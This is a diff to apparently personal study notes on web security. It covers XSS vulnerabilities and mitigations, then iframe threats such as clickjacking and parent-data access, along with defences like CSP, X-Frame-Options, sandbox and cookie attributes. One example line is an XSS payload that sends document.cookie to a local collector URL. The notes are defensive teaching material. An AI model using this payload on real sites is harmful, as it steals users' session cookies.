@@ -2,7 +2,7 @@ Overview
 ========
 [IMG:1]
 
-
+==========================
 XSS (Cross-Site Scripting)
 ==========================
 [IMG:2]
@@ -17,16 +17,16 @@ Vulnerabilities
      Example: ?name=<img src="does-not-exist" onerror="var img = document.createElement(\'img\');img.src=`http://127.0.0.1:5500/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
     (You can encode it using encodeURIComponent() and paste it in the URL.)
 (For remaining vulnerability examples, view below images)
-2. Unauthorized activities => If there is any publicly exposed function which makes api call, you can call that from your browser (from url) to pass hacking code.
+2. Unauthorized activities => If there is any publicly exposed function which makes api call, you can call that from your browser (from url) to pass hacking code. Like sometimes you have seen ou dont make a post in facebook but it get posted by hacker.
 3. Capturing Keystrokes => In the url, you can mention code to capture key strokes and pass it to your end point
 4. Stealing critical information => You can take the entire html code by injecting your script in the url.
-5. Phishing Attack => You can inject HTMl code from the URL which can be a form element replacing the actual form in the website
+5. Phishing Attack => You can inject HTMl code from the URL which can be a form element replacing the actual form in the website. Phishing is like making users do wrong things, such as when you click bad link, they inject malware into your system
 [IMG:3-6]
 
 
 Mitigations
 ...........
-1. List all possible ways to take user input
+1. List all possible ways to take user input - (Like url, forms, input fields and sanitize them)
 2. Replace innerHtml with innerText / textContent
 3. Escaping  - (Escape html statring (<) ending (>) tags from the input)
 4. Use libraries like React which by defult takes cares of thse XSS - (Because when you mention {name} in jsx, it expects only the text/js code text so by defult ignores of all these html injections)
@@ -47,3 +47,41 @@ View index.js inside mitigation folder
 
 SUMMARY of XSS: Anyone can inject anything from url - query param, if you are showing that query param in UI/code. They can steal critical info/capture Keystrokes and many more. As a developer we need to take care of these things by not using innerHTML, by escaping '<','>' tags and by sanitizing inputs before use using some libraries like DOMPurify. Last not the least we need to set headers like Content-Security-Policy to specify from what all origin we are allowed to download scrips/images/iframes...
 
+
+================
+IframeProtection
+================
+
+You show Adds in your website as iframes.
+
+When you are able to import another wbsite into your website using iframe there will be various security issues.
+
+[IMG:14]
+
+Vulnerabilities
+...............
+1. Click Hijacking - On top of iframe you can have your own button, on click on which data is sent to you
+2. Data theft via javascript - When you inject an iframe thinking it is safe, it can access parent/main website data using window.parent.document/window.parent.cookie. Once it gets the document object, it can do everything. Now a days modern websites restrict this but it is still a threat in older websites
+3. Session & Cookie theft - Same as above, you can get access to parent cookie using window.parent.cookie
+
+
+Mitigations
+...........
+
+1. X-Frame-Options 'sameorigin' - If you set this header to 'sameorigin', then no other orign except google will be able to render google.com as iframe
+2. CSP: frame-ancestors 'self' - This is a newer header and X-Frame-Options is older one, serving the same purpose
+3. sandbox iframe - Also from Parent while importing iframes, you can set an argument called sandbox -  sandbox="allow-same-origin allow-scripts allow-modals" which makes sure no scripts(like window.parent.cookie) executes in the sandbox other than just html until and unless you give allow-scripts as a value in sandbox.
+4. Whenever you set a cookie from server, you can set below attributes also
+        httpOnly: true - By setting this, you cannot accees cookie from client using document.cookie. You can only access it from server
+        secure: true - By setting this, cookie will be only sent if it is https. If it is http then the cookie wont be sent
+        sameSite: 'strict' - By setting this, when application is navigating from one page to another or when making third party API calls, the cookie wont be sent. That you can access them only in your site and not in other sites
+        (You can see all these all columns when you click on Cookies in Application tab)
+
+Note: There are many other security related attributes in iframe and different security related values in sandbox attribute. You can reffer mdn docs.
+Note: If a Parent website trying to access data from child website and you want to restrict that from child you can do as below in child html code
+ <script>
+      if (top != self) {
+        top.location = self.location;
+      }
+ </script>
+ //This is not required in modern borwsers as it will take care of such threats, but still it is safe to have
